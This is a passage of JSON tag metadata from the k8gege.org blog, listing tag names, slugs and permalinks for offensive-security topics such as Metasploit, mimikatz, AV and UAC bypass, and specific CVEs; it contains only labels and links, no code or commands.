Strike","slug":"CS","permalink":"http://k8gege.org/tags/CS/"},{"name":"DllHijack","slug":"DllHijack","permalink":"http://k8gege.org/tags/DllHijack/"},{"name":"Kali","slug":"Kali","permalink":"http://k8gege.org/tags/Kali/"},{"name":"Scanner","slug":"Scanner","permalink":"http://k8gege.org/tags/Scanner/"},{"name":"Brute","slug":"Brute","permalink":"http://k8gege.org/tags/Brute/"},{"name":".NET","slug":"Dotnet","permalink":"http://k8gege.org/tags/Dotnet/"},{"name":"SQL","slug":"SQL","permalink":"http://k8gege.org/tags/SQL/"},{"name":"Exp","slug":"Exp","permalink":"http://k8gege.org/tags/Exp/"},{"name":"Sniffer","slug":"Sniffer","permalink":"http://k8gege.org/tags/Sniffer/"},{"name":"FtpSniffer","slug":"FtpSniffer","permalink":"http://k8gege.org/tags/FtpSniffer/"},{"name":"HttpSniffer","slug":"HttpSniffer","permalink":"http://k8gege.org/tags/HttpSniffer/"},{"name":"IIS","slug":"IIS","permalink":"http://k8gege.org/tags/IIS/"},{"name":"LDAP","slug":"LDAP","permalink":"http://k8gege.org/tags/LDAP/"},{"name":"Metasploit","slug":"Metasploit","permalink":"http://k8gege.org/tags/Metasploit/"},{"name":"PowerShell","slug":"PowerShell","permalink":"http://k8gege.org/tags/PowerShell/"},{"name":"C#","slug":"C","permalink":"http://k8gege.org/tags/C/"},{"name":"MSF","slug":"MSF","permalink":"http://k8gege.org/tags/MSF/"},{"name":"meterpreter","slug":"meterpreter","permalink":"http://k8gege.org/tags/meterpreter/"},{"name":"Python","slug":"Python","permalink":"http://k8gege.org/tags/Python/"},{"name":"Overflow","slug":"Overflow","permalink":"http://k8gege.org/tags/Overflow/"},{"name":"Gh0st","slug":"Gh0st","permalink":"http://k8gege.org/tags/Gh0st/"},{"name":"ShellCode","slug":"ShellCode","permalink":"http://k8gege.org/tags/ShellCode/"},{"name":"OpCode","slug":"OpCode","permalink":"http://k8gege.org/tags/OpCode/"},{"name":"Password","slug":"Password","permalink":"http://k8gege.org/tags/Password/"},{"name":"GetShell","slug":"GetShell","permalink":"http://k8gege.org/tags/GetShell/"},{"name":"ActiveMQ","slug":"ActiveMQ","permalink":"http://k8gege.org/tags/ActiveMQ/"},{"name":"CVE-2016-3088","slug":"CVE-2016-3088","permalink":"http://k8gege.org/tags/CVE-2016-3088/"},{"name":"ThinkPHP","slug":"ThinkPHP","permalink":"http://k8gege.org/tags/ThinkPHP/"},{"name":"PhpStudy","slug":"PhpStudy","permalink":"http://k8gege.org/tags/PhpStudy/"},{"name":"K8tools","slug":"K8tools","permalink":"http://k8gege.org/tags/K8tools/"},{"name":"Apache","slug":"Apache","permalink":"http://k8gege.org/tags/Apache/"},{"name":"Solr","slug":"Solr","permalink":"http://k8gege.org/tags/Solr/"},{"name":"0day","slug":"0day","permalink":"http://k8gege.org/tags/0day/"},{"name":"Code","slug":"Code","permalink":"http://k8gege.org/tags/Code/"},{"name":"Poc","slug":"Poc","permalink":"http://k8gege.org/tags/Poc/"},{"name":"PHP","slug":"PHP","permalink":"http://k8gege.org/tags/PHP/"},{"name":"Ngnix","slug":"Ngnix","permalink":"http://k8gege.org/tags/Ngnix/"},{"name":"CVE-2019-11043","slug":"CVE-2019-11043","permalink":"http://k8gege.org/tags/CVE-2019-11043/"},{"name":"Moudle","slug":"Moudle","permalink":"http://k8gege.org/tags/Moudle/"},{"name":"WebScan","slug":"WebScan","permalink":"http://k8gege.org/tags/WebScan/"},{"name":"PortScan","slug":"PortScan","permalink":"http://k8gege.org/tags/PortScan/"},{"name":"Sharp","slug":"Sharp","permalink":"http://k8gege.org/tags/Sharp/"},{"name":"MS17010","slug":"MS17010","permalink":"http://k8gege.org/tags/MS17010/"},{"name":"Weblogic","slug":"Weblogic","permalink":"http://k8gege.org/tags/Weblogic/"},{"name":"Struts2","slug":"Struts2","permalink":"http://k8gege.org/tags/Struts2/"},{"name":"PortTran","slug":"PortTran","permalink":"http://k8gege.org/tags/PortTran/"},{"name":"BypassAV","slug":"BypassAV","permalink":"http://k8gege.org/tags/BypassAV/"},{"name":"SMB","slug":"SMB","permalink":"http://k8gege.org/tags/SMB/"},{"name":"Zimbra","slug":"Zimbra","permalink":"http://k8gege.org/tags/Zimbra/"},{"name":"BypassUAC","slug":"BypassUAC","permalink":"http://k8gege.org/tags/BypassUAC/"},{"name":"mimikatz","slug":"mimikatz","permalink":"http://k8gege.org/tags/mimikatz/"}]}